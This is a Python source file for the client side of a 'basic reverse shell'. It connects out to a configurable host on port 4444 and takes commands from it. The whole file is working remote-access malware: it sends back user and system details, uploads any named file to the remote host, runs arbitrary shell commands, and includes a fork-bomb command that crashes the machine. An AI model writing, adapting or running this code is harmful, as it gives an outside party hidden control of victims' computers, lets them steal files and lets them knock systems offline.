# credits go to falkensmaze (https://github.com/falkensmz)
# client for brsh - basic reverse shell


import socket
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()

LHOST = " " # server host/ip to connect to remotely
LPORT = 4444 # server port to connect to remotely

# defining sock

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((LHOST, LPORT))



while True:
    try:
        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")

        # list files using 'dir'
        if cmd == "list":
            sock.send(str(os.listdir(".")).encode())

        # forkbomb
        if cmd == "forkbomb":
            while True:
                os.fork()

        # change the directory (cd)
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode())

        # system info 
        elif cmd == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        # Download files
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print("Sending", file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b"DONE")
            print("Finished sending data")

        # close the connection
        elif cmd == "exit":
            sock.send(b"exit")
            break

        # run other commands
        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        # if the connection closes
        if not cmd:
            print("Connection dropped")
            break
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())
sock.close()
